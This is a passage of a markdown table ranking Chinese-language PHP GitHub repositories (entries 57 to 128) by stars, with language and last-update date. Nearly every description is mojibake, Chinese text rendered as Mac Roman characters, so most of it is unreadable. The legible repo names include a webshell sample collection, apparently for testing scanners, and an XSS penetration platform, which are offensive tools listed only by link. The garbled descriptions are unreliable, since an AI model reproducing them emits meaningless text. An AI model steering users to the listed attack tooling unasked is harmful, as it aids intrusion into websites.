ÂÅöÂà∞‰∫ÜÊ∂àÊÅØÁöÑÂÆûÊó∂Êé®ÈÄÅÔºåÂπ∂Âú®Ê≠§Âü∫Á°Ä‰∏äÔºåÂÆûÁé∞‰∫ÜËÅäÂ§©ÂÆ§ÂíåÂÆ¢ÊúçÂäüËÉΩ„ÄÇÊùÉÈôêÁÆ°ÁêÜÂåÖÊã¨ÂêéÁ´ØTokenËÆ§ËØÅÂíåÂâçÁ´Øvue.jsÁöÑÂä®ÊÄÅÊùÉÈôêÔºåËß£ÂÜ≥‰∫ÜÂâçÂêéÁ´ØÂÆåÊï¥ÂàÜÁ¶ªÁöÑÊÉÖÂÜµ‰∏ãÔºåvue.jsÁöÑËÆ§ËØÅ‰∏éÊùÉÈôêÁõ∏ÂÖ≥ÁöÑÁóõÁÇπÔºåÂ∑≤Âú®Êú¨‰∫∫ÁöÑÂ§ö‰∏™È°πÁõÆ‰∏≠ÈõÜÊàê‰ΩøÁî®„ÄÇ|734|PHP|09/10|
|57|[iqiqiya/iqiqiya-API](https://github.com/iqiqiya/iqiqiya-API)|APIÊé•Âè£Â§ßÂÖ®‰∏çÊñ≠Êõ¥Êñ∞‰∏≠~Ê¨¢ËøéForkÂíåStar(‚úé 1.‰∏ÄË®Ä(Âè§ËØóÂè•Áâà)api  ‚úé 2.ÂøÖÂ∫îÊØèÊó•‰∏ÄÂõæapi  ‚úé 3.Âú®Á∫øipÊü•ËØ¢  ‚úé 4.m3u8ËßÜÈ¢ëÂú®Á∫øËß£Êûêapi  ‚úé 5.ÈöèÊú∫ÁîüÊàê‰∫åÊ¨°ÂÖÉÂõæÁâáapi  ‚úé 6.Âø´ÈÄíÊü•ËØ¢api-ÊîØÊåÅÂõΩÂÜÖÁôæÂÆ∂Âø´ÈÄí  ‚úé 7.flvËßÜÈ¢ëÂú®Á∫øËß£Êûêapi ‚úé 8.ÊäñÈü≥ËßÜÈ¢ëÊó†Ê∞¥Âç∞Ëß£Êûêapi‚úé 9.‰∏ÄÂè•ËØùÈöèÊú∫ÂõæÁâáapi‚úé 10.QQÁî®Êà∑‰ø°ÊÅØËé∑Âèñapi‚úé11.ÂìîÂì©ÂìîÂì©Â∞ÅÈù¢ÂõæËé∑Âèñapi‚úé12.ÂçÉÂõæÁΩë58picÊó†Ê∞¥Âç∞Ëß£Êûê‰∏ãËΩΩapi‚úé13.ÂñúÈ©¨ÊãâÈõÖ‰∏ªÊí≠FMÊï∞ÊçÆÈááÈõÜapi‚úé14.ÁΩëÊòì‰∫ëÈü≥‰πêapi‚úé15.CCTVÂ§ÆËßÜÁΩëËßÜÈ¢ëËß£Êûêapi‚úé16.ÂæÆ‰ø°ËøêÂä®Âà∑Ê≠•Êï∞api‚úé17.ÁöÆÁöÆÊêûÁ¨ë ...|734|PHP|06/01|
|58|[solstice23/argon-theme](https://github.com/solstice23/argon-theme)|üìñ Argon - ‰∏Ä‰∏™ËΩªÁõà„ÄÅÁÆÄÊ¥ÅÁöÑ WordPress ‰∏ªÈ¢ò|729|PHP|10/25|
|59|[duoergun0729/1book](https://github.com/duoergun0729/1book)|„ÄäWebÂÆâÂÖ®‰πãÊú∫Âô®Â≠¶‰π†ÂÖ•Èó®„Äã|719|PHP|02/23|
|60|[insoxin/API](https://github.com/insoxin/API)|Âß¨Èïø‰ø°API For Docker ‰∏Ä‰∏™Âü∫‰∫éÂ§öÁßçÁºñÁ®ãËØ≠Ë®ÄÂºÄÊ∫êÂÖçË¥π‰∏çÈôêÂà∂Êèê‰æõÁîüÊ¥ªÂ∏∏Áî®,Âá∫Ë°åÊúçÂä°,ÂºÄÂèëÂ∑•ÂÖ∑,ÈáëËûçÊúçÂä°,ÈÄöËÆØÊúçÂä°ÂíåÂÖ¨ÁõäÂ§ßÊï∞ÊçÆÁöÑÂπ≥Âè∞.|699|PHP|07/06|
|61|[Yurunsoft/PaySDK](https://github.com/Yurunsoft/PaySDK)|PHP ÈõÜÊàêÊîØ‰ªò SDK ÔºåÈõÜÊàê‰∫ÜÊîØ‰ªòÂÆù„ÄÅÂæÆ‰ø°ÊîØ‰ªòÁöÑÊîØ‰ªòÊé•Âè£ÂíåÂÖ∂ÂÆÉÁõ∏ÂÖ≥Êé•Âè£ÁöÑÊìç‰Ωú„ÄÇÊîØÊåÅ php-fpm Âíå SwooleÔºåÊâÄÊúâÊ°ÜÊû∂ÈÄöÁî®„ÄÇÂÆáÊ∂¶PHPÂÖ®ÂÆ∂Ê°∂ÊäÄÊúØÊîØÊåÅÁæ§Ôºö17916227|686|PHP|08/19|
|62|[itbdw/ip-database](https://github.com/itbdw/ip-database)|üì°ÂÖçË¥πIPÊï∞ÊçÆÂ∫ì (Á∫ØÁúüIPÂ∫ìÔºåÂ∑≤ÁªèÊ†ºÂºè‰∏∫ÂõΩÂÆ∂„ÄÅÁúÅ„ÄÅÂ∏Ç„ÄÅÂéø„ÄÅËøêËê•ÂïÜ)‚ù§Ô∏è üá®üá≥Ôºå‰∏≠ÊñáÊï∞ÊçÆÂ∫ìÔºåÊñπ‰æøÂÆûÁî®|630|PHP|10/14|
|63|[luolongfei/freenom](https://github.com/luolongfei/freenom)|FreenomÂüüÂêçËá™Âä®Áª≠Êúü„ÄÇFreenom domain name renews automatically.|630|PHP|10/25|
|64|[Yurunsoft/imi](https://github.com/Yurunsoft/imi)|imi ÊòØÂü∫‰∫é Swoole ÁöÑ PHP ÂçèÁ®ãÂºÄÂèëÊ°ÜÊû∂ÔºåÂÆÉÊîØÊåÅ Http„ÄÅHttp2„ÄÅWebSocket„ÄÅTCP„ÄÅUDP„ÄÅMQTT Á≠â‰∏ªÊµÅÂçèËÆÆÁöÑÊúçÂä°ÂºÄÂèëÔºåÁâπÂà´ÈÄÇÂêà‰∫íËÅîÁΩëÂæÆÊúçÂä°„ÄÅÂç≥Êó∂ÈÄöËÆØËÅäÂ§©im„ÄÅÁâ©ËÅîÁΩëÁ≠âÂú∫ÊôØÔºÅ„ÄÇQQÁæ§Ôºö17916227|616|PHP|10/29|
|65|[zencodex/composer-mirror](https://github.com/zencodex/composer-mirror)|Composer ÂÖ®ÈáèÈïúÂÉèÂèëÂ∏É‰∫é2017Âπ¥3ÊúàÔºåËá≥‰ªäÂ∑≤‰∏çÈó¥Êñ≠ËøêË°å2Âπ¥Â§ö„ÄÇËøô‰∏™ÂºÄÊ∫êÊúâÂä©‰∫éÁêÜËß£ Composer ÈïúÂÉèÁöÑÂ∑•‰ΩúÂéüÁêÜ|604|PHP|10/19|
|66|[ysrc/webshell-sample](https://github.com/ysrc/webshell-sample)|Êî∂ÈõÜËá™ÁΩëÁªúÂêÑÂ§ÑÁöÑ webshell Ê†∑Êú¨ÔºåÁî®‰∫éÊµãËØï webshell Êâ´ÊèèÂô®Ê£ÄÊµãÁéá„ÄÇ|601|PHP|10/01|
|67|[wanglelecc/laracms](https://github.com/wanglelecc/laracms)|LaraCMS ÊòØÂú®Â≠¶‰π† laravel Ôºà web ÂºÄÂèëÂÆûÊàòËøõÈò∂ + ÂÆûÊàòÊûÑÊû∂ API ÊúçÂä°Âô®Ôºâ ËøáÁ®ã‰∏≠‰∫ßÁîüÁöÑ‰∏Ä‰∏™‰∏ö‰Ωô‰ΩúÂìÅÔºåËØïÂõæÈÄöËøáÁÆÄÂçïÁöÑÊñπÂºèÔºåÂø´ÈÄüÊûÑÂª∫‰∏ÄÂ•óÂü∫Êú¨ÁöÑ‰ºÅ‰∏öÁ´ôÂêåÊó∂‰øùÁïôÂæàÁÅµÊ¥ªÁöÑÊâ©Â±ïËÉΩÂäõÂíå‰ºòÈõÖÁöÑ‰ª£Á†ÅÊñπÂºèÔºåÂΩìÁÑ∂Ëøô‰∫õÈÉΩÂæóÁõäLaravelÁöÑ‰ºòÁßÄËÆæËÆ°„ÄÇÂêåÊó∂LaraCMS ‰πüÊòØ‰∏Ä‰∏™Â≠¶‰π†Laravel ‰∏çÈîôÁöÑÂèÇËÄÉÁ§∫‰æã„ÄÇ|575|PHP|06/06|
|68|[72crm/72crm](https://github.com/72crm/72crm)|ÊÇüÁ©∫CRM-Âü∫‰∫éTP5.0+vue+ElementUIÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªCRMÁ≥ªÁªü|568|PHP|03/23|
|69|[fghrsh/live2d_api](https://github.com/fghrsh/live2d_api)|Live2D ÁúãÊùøÂ®òÊèí‰ª∂ (https://www.fghrsh.net/post/123.html) ‰∏ä‰ΩøÁî®ÁöÑÂêéÁ´Ø API|559|PHP|05/19|
|70|[letwang/HookPHP](https://github.com/letwang/HookPHP)|HookPHPÂü∫‰∫éCÊâ©Â±ïÊê≠Âª∫ÂÜÖÁΩÆAIÁºñÁ®ãÁöÑÊû∂ÊûÑÁ≥ªÁªü-ÊîØÊåÅÂæÆÊúçÂä°ÈÉ®ÁΩ≤ ÁÉ≠ÊèíÊãî‰∏öÂä°ÁªÑ‰ª∂-ÈõÜÊàê‰∏öÂä°Ê®°Âûã ÊùÉÈôêÊ®°Âûã UIÁªÑ‰ª∂Â∫ì Â§öÊ®°Êùø Â§öÂπ≥Âè∞ Â§öÂüüÂêç Â§öÁªàÁ´Ø Â§öËØ≠Ë®Ä-Âê´Â∏∏È©ªÂÜÖÂ≠ò ÂâçÂêéÂàÜÁ¶ª APIÂπ≥Âè∞ LUA QQÁæ§Ôºö679116380|559|PHP|07/14|
|71|[owen0o0/WebStack](https://github.com/owen0o0/WebStack)|WordPress Áâà WebStack ÂØºËà™‰∏ªÈ¢ò https://nav.iowen.cn|557|PHP|02/23|
|72|[zdhxiong/mdclub](https://github.com/zdhxiong/mdclub)|MDClub Á§æÂå∫Á≥ªÁªüÂêéÁ´Ø‰ª£Á†Å|556|PHP|10/29|
|73|[xaboy/form-builder](https://github.com/xaboy/form-builder)|PHPË°®ÂçïÁîüÊàêÂô®ÔºåÂø´ÈÄüÁîüÊàêÁé∞‰ª£ÂåñÁöÑformË°®Âçï,ÊîØÊåÅÂâçÂêéÁ´ØÂàÜÁ¶ª„ÄÇÂÜÖÁΩÆÂ§çÈÄâÊ°Ü„ÄÅÂçïÈÄâÊ°Ü„ÄÅËæìÂÖ•Ê°Ü„ÄÅ‰∏ãÊãâÈÄâÊã©Ê°Ü,ÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®,Êó∂Èó¥ÈÄâÊã©,Êó•ÊúüÈÄâÊã©,È¢úËâ≤ÈÄâÊã©,Êñá‰ª∂/ÂõæÁâá‰∏ä‰º†Á≠â17ÁßçÂ∏∏Áî®ÁªÑ‰ª∂„ÄÇ|552|PHP|05/31|
|74|[mingyoung/dingtalk](https://github.com/mingyoung/dingtalk)|üåà EasyDingTalk - ÈíâÈíâ SDK|552|PHP|10/03|
|75|[5iux/sou](https://github.com/5iux/sou)|ÁÆÄÂçïÊêúÁ¥¢Ôºå‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂâçÁ´ØÁïåÈù¢„ÄÇÁî®ÊÉØ‰∫ÜÂêÑÁßçÂØºËà™È¶ñÈ°µÔºåÊª°Â±èÂπïÂ∞ΩÊòØÂêÑÁßç‰∏çÂéåÂÖ∂ÁÉ¶ÁöÑÂπøÂëäÂíåËµÑËÆØÔºõÂ∞ùËØïËá™Â∑±ÂÜô‰∏™Ëá™Â∑±ÁöÑ‰∏ªÈ°µ„ÄÇ|546|PHP|10/10|
|76|[zzjzz9266a/91porn_php](https://github.com/zzjzz9266a/91porn_php)|ÊúÄÁÆÄÂçïÁöÑ91pornÁà¨Ëô´phpÁâàÊú¨|538|PHP|09/11|
|77|[tal-tech/fend](https://github.com/tal-tech/fend)|Fend ÊòØ‰∏ÄÊ¨æÁü≠Â∞èÁ≤æÊÇçÔºåÂèØÂú® FPM/Swoole ÊúçÂä°ÂÆπÂô®Âπ≥ÊªëÂàáÊç¢ÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|537|PHP|09/14|
|78|[guojiangclub/ecommerce-open-api](https://github.com/guojiangclub/ecommerce-open-api)|ÊûúÈÖ±Â∞èÂ∫óÔºöÂü∫‰∫é Laravel + swoole + Â∞èÁ®ãÂ∫èÁöÑÂºÄÊ∫êÁîµÂïÜÁ≥ªÁªüÔºå‰ºòÈõÖ‰∏éÊÄßËÉΩÂÖºÈ°æ  : ) |521|PHP|06/24|
|79|[oott123/bpcs_uploader](https://github.com/oott123/bpcs_uploader)|ÁôæÂ∫¶pcs‰∏ä‰º†ËÑöÊú¨|513|PHP|05/12|
|80|[zdhxiong/Material-Design-Chinese](https://github.com/zdhxiong/Material-Design-Chinese)|Material Design ÊåáÂçóÁöÑ‰∏≠ÊñáÁøªËØë|511|PHP|10/14|
|81|[ZsgsDesign/NOJ](https://github.com/ZsgsDesign/NOJ)|‚ö° open-source online judge based on Laravel   Âçó‰∫¨ÈÇÆÁîµÂ§ßÂ≠¶ÂºÄÊ∫ê Online Judge   QQÁæ§Ôºö668108264|495|PHP|10/30|
|82|[TarsPHP/TarsPHP](https://github.com/TarsPHP/TarsPHP)|Âü∫Á°ÄÁõÆÂΩïÔºåËÅöÂêàÊâÄÊúâÂÖ∂‰ªñÁõÆÂΩïÔºåÂåÖÂê´ÊñáÊ°£Âíå‰æãÂ≠ê|494|PHP|07/07|
|83|[zblogcn/zblogphp](https://github.com/zblogcn/zblogphp)|Z-BlogPHPÂçöÂÆ¢Á®ãÂ∫è|494|PHP|10/15|
|84|[init-engineer/init.engineer](https://github.com/init-engineer/init.engineer)|ÈÄôÊòØ‰∏Ä‰ªΩÁ¥îÈù†ÂåóÂ∑•Á®ãÂ∏´ÁöÑÂ∞àÊ°àÔºåË´ãÂ•ΩÂ•ΩÊÑõË≠∑ÂÆÉÔºåË¨ùË¨ù„ÄÇ|493|PHP|10/22|
|85|[FireLustre/php-dfa-sensitive](https://github.com/FireLustre/php-dfa-sensitive)|:see_no_evil: ÂÆûÁé∞ËøáÊª§ÊïèÊÑüËØçÊ±á:underage:ÔºåÂü∫‰∫éÁ°ÆÂÆöÊúâÁ©∑Ëá™Âä®Êú∫(DFA)ÁÆóÊ≥ïÔºåÊîØÊåÅcomposerÂÆâË£ÖÊâ©Â±ï|487|PHP|02/29|
|86|[bingcool/swoolefy](https://github.com/bingcool/swoolefy)|swoolefyÊòØ‰∏Ä‰∏™Âü∫‰∫éswooleÂÆûÁé∞ÁöÑËΩªÈáèÁ∫ß„ÄÅÈ´òÊÄßËÉΩ„ÄÅÂçèÁ®ãÁ∫ß„ÄÅÂºÄÊîæÊÄßÁöÑAPIÂ∫îÁî®ÊúçÂä°Ê°ÜÊû∂|486|PHP|10/23|
|87|[jxlwqq/id-validator](https://github.com/jxlwqq/id-validator)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂ±ÖÊ∞ëË∫´‰ªΩËØÅ„ÄÅ‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÊ∏ØÊæ≥Â±ÖÊ∞ëÂ±Ö‰ΩèËØÅ‰ª•Âèä‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂè∞ÊπæÂ±ÖÊ∞ëÂ±Ö‰ΩèËØÅÂè∑Á†ÅÈ™åËØÅÂ∑•ÂÖ∑ÔºàPHP Composer ÁâàÔºâ|485|PHP|09/30|
|88|[lizhichao/VicWord](https://github.com/lizhichao/VicWord)| ‰∏Ä‰∏™Á∫ØphpÂàÜËØç|480|PHP|07/30|
|89|[johnlui/AliyunOSS](https://github.com/johnlui/AliyunOSS)|ÈòøÈáå‰∫ë OSS ÂÆòÊñπ SDK ÁöÑ Composer Â∞ÅË£ÖÔºåÊîØÊåÅ‰ªª‰Ωï PHP È°πÁõÆÔºåÂåÖÊã¨ Laravel„ÄÅSymfony„ÄÅTinyLara Á≠âÁ≠â„ÄÇ|476|PHP|06/19|
|90|[seth-shi/monday-shop](https://github.com/seth-shi/monday-shop)|ÁΩë‰∏äÂú®Á∫øÂïÜÂüé„ÄÅÁªºÂêàÁΩë‰∏äË¥≠Áâ©Âπ≥Âè∞|472|PHP|05/30|
|91|[fucongcong/GroupCo](https://github.com/fucongcong/GroupCo)|PHPÁöÑÊúçÂä°ÂåñÊ°ÜÊû∂„ÄÇÈÄÇÁî®‰∫éApi„ÄÅHttp Server„ÄÅRpc ServerÔºõÂ∏ÆÂä©ÂéüÁîüPHPÈ°πÁõÆËΩ¨ÂêëÂæÆÊúçÂä°Âåñ„ÄÇÂá∫Ëâ≤ÁöÑÊÄßËÉΩ‰∏éÊîØÊåÅÈ´òÂπ∂ÂèëÁöÑÂçèÁ®ãÁõ∏ÁªìÂêà|470|PHP|07/28|
|92|[jacobcyl/Aliyun-oss-storage](https://github.com/jacobcyl/Aliyun-oss-storage)|ÈòøÈáå‰∫ëOSS laravel storage Filesystem adapter, ÊâìÈÄ†LaravelÊúÄÂ•ΩÁöÑOSS StorageÊâ©Â±ï.|467|PHP|09/21|
|93|[toxmc/statistics](https://github.com/toxmc/statistics)|‰∏Ä‰∏™ËøêÁî®php‰∏éswooleÂÆûÁé∞ÁöÑÁªüËÆ°ÁõëÊéßÁ≥ªÁªü|441|PHP|05/19|
|94|[DOUBLE-Baller/momo](https://github.com/DOUBLE-Baller/momo)|Áõ¥Êí≠Ê∫êÁ†Å,phpÁõ¥Êí≠,Áü≠ËßÜÈ¢ë,Áõ¥Êí≠Â∏¶Ë¥ß,‰ªøÊØîÂøÉ,ÁåéÊ∏∏,ttËØ≠Èü≥ËÅäÂ§©,ÁæéÂ•≥Á∫¶Áé©,Èô™Áé©Á≥ªÁªüÊ∫êÁ†ÅÂºÄÈªë,Á∫¶Áé©Ê∫êÁ†Å.|431|PHP|10/08|
|95|[Zhao-github/ApiAdmin](https://github.com/Zhao-github/ApiAdmin)|Âü∫‰∫éThinkPHP V5.1.*ÂºÄÂèëÁöÑÈù¢ÂêëAPIÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºÅ|430|PHP|06/15|
|96|[kasuganosoras/SyncMusic](https://github.com/kasuganosoras/SyncMusic)|üéµ PHP Swoole ÂºÄÂèëÁöÑÂú®Á∫øÂêåÊ≠•ÁÇπÊ≠åÂè∞ÔºåÊîØÊåÅËá™Áî±ÁÇπÊ≠åÔºåÂàáÊ≠åÔºåË∞ÉÊï¥ÊéíÂ∫èÔºåÂà†Èô§ÊåáÂÆöÈü≥‰πê‰ª•ÂèäÂü∫Á°ÄÊùÉÈôêÂàÜÁ∫ß|419|PHP|05/04|
|97|[szvone/vmqphp](https://github.com/szvone/vmqphp)|VÂÖçÁ≠æPHPÁâà ÂÆåÂÖ®ÂºÄÊ∫êÂÖçË¥πÁöÑ‰∏™‰∫∫ÂÖçÁ≠æÁ∫¶Ëß£ÂÜ≥ÊñπÊ°à|418|PHP|05/26|
|98|[tide-emergency/yingji](https://github.com/tide-emergency/yingji)|Â∫îÊÄ•Áõ∏ÂÖ≥ÂÜÖÂÆπÁßØÁ¥Ø|416|PHP|03/31|
|99|[rainrocka/xinhu](https://github.com/rainrocka/xinhu)|‰ø°ÂëºÔºåÂÖçË¥πÂºÄÊ∫êÁöÑÂäûÂÖ¨OAÁ≥ªÁªüÔºåÂåÖÊã¨APPÔºåpc‰∏äÂÆ¢Êà∑Á´ØÔºåREIMÂç≥Êó∂ÈÄö‰ø°ÔºåÊúçÂä°Á´ØÁ≠âÔºåËÆ©ÊØè‰∏™‰ºÅ‰∏öÂçï‰ΩçÈÉΩÊúâËá™Â∑±ÁöÑÂäûÂÖ¨Á≥ªÁªü„ÄÇ |414|PHP|10/13|
|100|[HelipengTony/tony](https://github.com/HelipengTony/tony)|An Elegant WordPress Theme Based on :v:Vue.js   Âü∫‰∫é Vue.js ÁöÑÁÆÄÊ¥Å‰∏ÄËà¨Âº∫Â§ßÁöÑ WordPress ÂçïÊ†èÂçöÂÆ¢‰∏ªÈ¢ò|413|PHP|10/01|
|101|[iiYii/getyii](https://github.com/iiYii/getyii)|Yii2 community ËØ∑ËÆøÈóÆ|411|PHP|09/16|
|102|[hnaoyun/PbootCMS](https://github.com/hnaoyun/PbootCMS)|PbootCMSÊòØÂÖ®Êñ∞ÂÜÖÊ†∏‰∏îÊ∞∏‰πÖÂºÄÊ∫êÂÖçË¥πÁöÑPHP‰ºÅ‰∏öÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæÁÆ°ÁêÜÁ≥ªÁªüÔºåÊòØ‰∏ÄÂ•óÈ´òÊïà„ÄÅÁÆÄÊ¥Å„ÄÅ Âº∫ÊÇçÁöÑÂèØÂÖçË¥πÂïÜÁî®ÁöÑPHP CMSÊ∫êÁ†ÅÔºåËÉΩÂ§üÊª°Ë∂≥ÂêÑÁ±ª‰ºÅ‰∏öÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæÁöÑÈúÄË¶Å„ÄÇÁ≥ªÁªüÈááÁî®ÁÆÄÂçïÂà∞ÊÉ≥Âì≠ÁöÑÊ®°ÊùøÊ†áÁ≠æÔºåÂè™Ë¶ÅÊáÇHTMLÂ∞±ÂèØÂø´ÈÄüÂºÄÂèë‰ºÅ‰∏öÁΩëÁ´ô„ÄÇÂÆòÊñπÊèê‰æõ‰∫ÜÂ§ßÈáèÁΩëÁ´ôÊ®°ÊùøÂÖçË¥π‰∏ãËΩΩÂíå‰ΩøÁî®ÔºåÂ∞ÜËá¥Âäõ‰∫é‰∏∫ÂπøÂ§ßÂºÄÂèëËÄÖÂíå‰ºÅ‰∏öÊèê‰æõÊúÄ‰Ω≥ÁöÑÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæËß£ÂÜ≥ÊñπÊ°à„ÄÇ|410|PHP|10/11|
|103|[Siphils/Typecho-Theme-Aria](https://github.com/Siphils/Typecho-Theme-Aria)|Typecho Theme Aria - ‰π¶ÂÜôËá™Â∑±ÁöÑÁØáÁ´†|403|PHP|02/21|
|104|[ZeroDream-CN/SakuraPanel](https://github.com/ZeroDream-CN/SakuraPanel)|Ê®±Ëä±ÂÜÖÁΩëÁ©øÈÄèÁΩëÁ´ôÊ∫ê‰ª£Á†ÅÔºå2020 ÈáçÂà∂Áâà|397|PHP|10/09|
|105|[jiangxianli/ProxyIpLib](https://github.com/jiangxianli/ProxyIpLib)|ÂÖ®ÁêÉÂÖçË¥π‰ª£ÁêÜIPÂ∫ìÔºåÈ´òÂèØÁî®IPÔºåÁ≤æÂøÉÁ≠õÈÄâ‰ºòË¥®IP,2sÂøÖËææ|393|PHP|10/29|
|106|[overtrue/chinese-calendar](https://github.com/overtrue/chinese-calendar)|:date: ‰∏≠ÂõΩÂÜúÂéÜÔºàÈò¥ÂéÜÔºâ‰∏éÈò≥ÂéÜÔºàÂÖ¨ÂéÜÔºâËΩ¨Êç¢‰∏éÊü•ËØ¢Â∑•ÂÖ∑|392|PHP|09/14|
|107|[wp-china/wp-china-yes](https://github.com/wp-china/wp-china-yes)|Ê≠§Êèí‰ª∂Â∞Ü‰Ω†ÁöÑWordPressÊé•ÂÖ•Êú¨ÂúüÁîüÊÄÅ‰ΩìÁ≥ª‰πã‰∏≠Ôºå‰Ωø‰πãÊõ¥ÈÄÇÂêàÂõΩÂÜÖÂ∫îÁî®ÁéØÂ¢É|391|PHP|10/28|
|108|[a54552239/pearProjectApi](https://github.com/a54552239/pearProjectApi)|È°πÁõÆÁÆ°ÁêÜÁ≥ªÁªüÂêéÁ´ØÊé•Âè£|385|PHP|10/21|
|109|[moell-peng/mojito](https://github.com/moell-peng/mojito)|Mojito  Admin Âü∫‰∫é Laravel, Vue, Element ÊûÑÂª∫ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|384|PHP|07/15|
|110|[4x99/code6](https://github.com/4x99/code6)|Á†ÅÂ∞èÂÖ≠ - GitHub ‰ª£Á†ÅÊ≥ÑÈú≤ÁõëÊéßÁ≥ªÁªü|382|PHP|10/23|
|111|[lkeme/BiliHelper](https://github.com/lkeme/BiliHelper)|ÔºàBilibiliÔºâB Á´ôËá™Âä®È¢ÜÁìúÂ≠ê„ÄÅÁõ¥Êí≠Âä©Êâã„ÄÅÁõ¥Êí≠ÊåÇÊú∫ËÑöÊú¨„ÄÅ‰∏ªÁ´ôÂä©Êâã - PHP Áâà|377|PHP|02/14|
|112|[Yurunsoft/ChineseUtil](https://github.com/Yurunsoft/ChineseUtil)|PHP ‰∏≠ÊñáÂ∑•ÂÖ∑ÂåÖÔºåÊîØÊåÅÊ±âÂ≠óËΩ¨ÊãºÈü≥„ÄÅÊãºÈü≥ÂàÜËØç„ÄÅÁÆÄÁπÅ‰∫íËΩ¨„ÄÅÊï∞Â≠ó„ÄÅÈáëÈ¢ùÂ§ßÂÜôÔºõQQÁæ§Ôºö17916227|376|PHP|10/21|
|113|[OMGZui/noteBook](https://github.com/OMGZui/noteBook)|üçé  Á¨îËÆ∞Êú¨|365|PHP|09/30|
|114|[top-think/think-queue](https://github.com/top-think/think-queue)|ThinkPHP ÈòüÂàóÊîØÊåÅ|364|PHP|09/05|
|115|[han8gui/PHPer](https://github.com/han8gui/PHPer)|‰∏Ä‰∏™PHPerÁöÑÂçáÁ∫ß‰πãË∑Ø|358|PHP|10/12|
|116|[xytoki/TCShare](https://github.com/xytoki/TCShare)| Âêé‰ºöÊúâÊúü„ÄÇ|349|PHP|04/19|
|117|[ZainCheung/netease-cloud-api](https://github.com/ZainCheung/netease-cloud-api)|ÁΩëÊòì‰∫ëÈü≥‰πêÂçáÁ∫ßAPI|348|PHP|09/26|
|118|[weipxiu/Art_Blog](https://github.com/weipxiu/Art_Blog)|WordPressÂìçÂ∫îÂºèÂÖçË¥π‰∏ªÈ¢òÔºåArt_BlogÂîØÂìÅÁßÄÂçöÂÆ¢Ôºàweipxiu.comÔºâÔºåÂºÄÊ∫êÁªôÂ∞è‰ºô‰º¥ÂÖçË¥π‰ΩøÁî®ÔºåÂ¶Ç‰ΩøÁî®ËøáÁ®ãÊúâ‰ªª‰ΩïÈóÆÈ¢òÔºåÂú®Á∫øÊäÄÊúØÊîØÊåÅQQ:343049466ÔºåÊ¨¢ËøéÊâìÊâ∞„ÄÇÂéüÂàõ‰∏çÊòìÔºåÂ¶ÇÂñúÊ¨¢ÔºåËØ∑Â§öÂ§öÊâìËµè„ÄÇÊºîÁ§∫Ôºö|337|PHP|10/28|
|119|[78778443/xssplatform](https://github.com/78778443/xssplatform)|‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑXSSÊ∏óÈÄèÁÆ°ÁêÜÂπ≥Âè∞|334|PHP|03/04|
|120|[caiweiming/DolphinPHP](https://github.com/caiweiming/DolphinPHP)|Êµ∑Ë±öPHP‚Äî‚ÄîÂü∫‰∫éThinkPHP5.1.34LTSÁöÑÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂|333|PHP|07/26|
|121|[walkor/workerman-statistics](https://github.com/walkor/workerman-statistics)|‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÁªüËÆ°ÁõëÊéßÁ≥ªÁªü ÂåÖÂê´PHPÂÆ¢Êà∑Á´Ø „ÄÅÊúçÂä°Á´Ø|325|PHP|03/09|
|122|[weeshop/WeeShop](https://github.com/weeshop/WeeShop)|‰ºòÈõÖÊòìÁî®ÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåPHPÂïÜÂüé„ÄÇ Âü∫‰∫éLaravelÁöÑÂü∫Âõ†ÔºåÊù•Ëá™SymfonyÁöÑÂ∫ïÂ±ÇÊäÄÊúØÔºåÊù•Ëá™Drupal CommerceÁöÑÊ†∏ÂøÉÊäÄÊúØÔºåÁî±Drupal‰∏≠ÂõΩÂºÄÊ∫êÁ§æÂå∫Áª¥Êä§„ÄÇQQÁæ§Ôºö714023327|325|PHP|05/05|
|123|[zbfzn/douyin-clear-php](https://github.com/zbfzn/douyin-clear-php)|ÊäñÈü≥ÂéªÊ∞¥Âç∞PHPÁâàÊé•Âè£|317|PHP|05/12|
|124|[YukiCoco/OLAINDEX-Magic](https://github.com/YukiCoco/OLAINDEX-Magic)|È≠îÊîπÁâàÊú¨Ôºå‰∏∫ OLAINDEX Ê∑ªÂä†Â§öÁΩëÁõòÊåÇËΩΩÂèä‰∏Ä‰∫õÂ∞è‰øÆÂ§ç|314|PHP|07/23|
|125|[hiliqi/xiaohuanxiong](https://github.com/hiliqi/xiaohuanxiong)|ÂºÄÊ∫êÊúâÊÄÅÂ∫¶ÁöÑÊº´ÁîªCMS|313|PHP|10/27|
|126|[niugengyun/easytbk](https://github.com/niugengyun/easytbk)|Ê∑òÂÆ¢5Âêà‰∏ÄSDKÔºåÊîØÊåÅÊ∑òÂÆùËÅîÁõü„ÄÅ‰∫¨‰∏úËÅîÁõü„ÄÅÂ§öÂ§öËøõÂÆù„ÄÅÂîØÂìÅ‰ºö„ÄÅËãèÂÆÅ|312|PHP|10/19|
|127|[ledccn/IYUUAutoReseed](https://github.com/ledccn/IYUUAutoReseed)|IYUUËá™Âä®ËæÖÁßçÂ∑•ÂÖ∑ÔºåÁõÆÂâçËÉΩÂØπÂõΩÂÜÖÂ§ßÈÉ®ÂàÜÁöÑPTÁ´ôÁÇπËá™Âä®ËæÖÁßçÔºåÊîØÊåÅ‰∏ãËΩΩÂô®ÈõÜÁæ§ÔºåÊîØÊåÅÂ§öÁõò‰ΩçÔºåÊîØÊåÅÂ§ö‰∏ãËΩΩÁõÆÂΩïÔºåÊîØÊåÅËøúÁ®ãËøûÊé•Á≠â„ÄÇ|311|PHP|10/04|
|128|[yupoxiong/BearAdmin](https://github.com/yupoxiong/BearAdmin)|Âü∫‰∫éThinkPHP5+AdminLTEÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|310|PHP|08/07|
